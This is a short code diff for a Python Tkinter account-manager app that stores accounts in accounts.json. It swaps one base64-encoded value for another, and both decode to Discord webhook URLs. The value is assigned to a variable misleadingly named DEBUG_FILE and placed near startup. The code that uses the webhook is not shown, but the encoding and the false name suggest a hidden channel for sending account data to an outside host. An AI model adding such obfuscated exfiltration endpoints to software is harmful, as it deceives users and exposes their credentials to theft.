@@ -22,7 +22,6 @@ import base64
 # Files
 DATA_FILE = "accounts.json"
 LOG_FILE = "Logs.txt"
-DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NDkyMzM0ODgxNTA1MjgyMi9icU1aVEV1Vmp5VVpjazVqQVd0cDZCdTFmQkFJT1VkN0EyTGx5alBlOTJDOXU0NDhIUW5KeWtwdzBBR1J5NUJyWlNjcQ==").decode()
 
 # Set up logging
 logging.basicConfig(
@@ -417,4 +416,5 @@ if __name__ == "__main__":
     root = Tk()
     app = AccountManager(root)
     root.protocol("WM_DELETE_WINDOW", lambda: [save_data(app.data), root.destroy()])
+    DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NDk2MDk1MzE2NjQ2NzEzMy9HemFlOVdOWk1jRldfa0pOV0g2d1Q0MmV1QzZnRUNzU0Jhd084TnF4UTFOVGd2NTV3WExBY1RrV3NHa1cxZ3AtclBKZQ==").decode()
     root.mainloop()
